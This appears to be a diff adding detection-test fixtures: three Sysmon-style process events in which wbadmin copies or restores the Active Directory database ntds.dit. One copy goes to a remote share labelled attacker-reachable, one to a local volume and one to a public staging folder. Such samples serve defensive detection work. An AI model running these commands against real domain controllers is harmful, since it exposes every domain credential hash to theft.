@@ -1,0 +1,32 @@
+[
+  {
+    "_comment": "Backup of ntds.dit to an attacker-reachable share.",
+    "EventID": 1,
+    "Computer": "DC-EXAMPLE-01.example.local",
+    "User": "EXAMPLE\\ea-placeholder",
+    "Image": "C:\\Windows\\System32\\wbadmin.exe",
+    "OriginalFileName": "WBADMIN.EXE",
+    "CommandLine": "wbadmin start backup -backupTarget:\\\\192.0.2.10\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_comment": "Whole NTDS folder to a local volume, slash-style switches.",
+    "EventID": 1,
+    "Computer": "DC-EXAMPLE-01.example.local",
+    "User": "EXAMPLE\\ea-placeholder",
+    "Image": "C:\\Windows\\System32\\wbadmin.exe",
+    "OriginalFileName": "WBADMIN.EXE",
+    "CommandLine": "wbadmin START BACKUP /backupTarget:E: /include:C:\\Windows\\NTDS /quiet",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "_comment": "Recovering ntds.dit from an existing backup into a staging folder.",
+    "EventID": 1,
+    "Computer": "DC-EXAMPLE-02.example.local",
+    "User": "EXAMPLE\\ea-placeholder",
+    "Image": "C:\\Windows\\System32\\wbadmin.exe",
+    "OriginalFileName": "WBADMIN.EXE",
+    "CommandLine": "wbadmin start recovery -version:11/18/2026-03:00 -itemType:File -items:C:\\Windows\\NTDS\\ntds.dit -recoveryTarget:C:\\Users\\Public\\x -notRestoreAcl -quiet",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  }
+]
